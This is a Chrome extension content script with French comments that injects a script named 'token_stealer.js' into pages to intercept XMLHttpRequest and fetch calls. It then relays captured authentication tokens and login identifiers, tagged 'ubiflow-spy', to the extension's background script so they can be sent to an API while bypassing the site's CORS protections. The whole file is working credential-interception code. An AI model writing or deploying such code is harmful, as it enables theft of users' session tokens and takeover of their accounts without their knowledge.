// Injection du script pour intercepter XMLHttpRequest/fetch dans le contexte de la page
const s = document.createElement('script');
s.src = chrome.runtime.getURL('token_stealer.js');
s.onload = function() {
    this.remove();
};
(document.head || document.documentElement).appendChild(s);

// Écoute les messages venant de token_stealer.js
window.addEventListener('message', function(e) {
    if (e.source !== window || !e.data || e.data.source !== 'ubiflow-spy') return;
    
    if (e.data.type === 'TOKEN_INTERCEPTED') {
        const token = e.data.token;
        const espaceLogin = e.data.espaceLogin || null;
        // Envoie au background.js pour bypasser les règles de sécurité CORS du site
        try {
            chrome.runtime.sendMessage({ action: 'SEND_TOKEN_TO_API', token: token, espaceLogin: espaceLogin });
        } catch (err) {
            // "Extension context invalidated" : arrive si l'extension a été rechargée
            // pendant que cet onglet était déjà ouvert. Sans ce filet, ça pouvait
            // remonter comme une erreur visible sur la page. Un simple rechargement
            // de l'onglet (pas juste l'extension) résout ça.
        }
    }
});
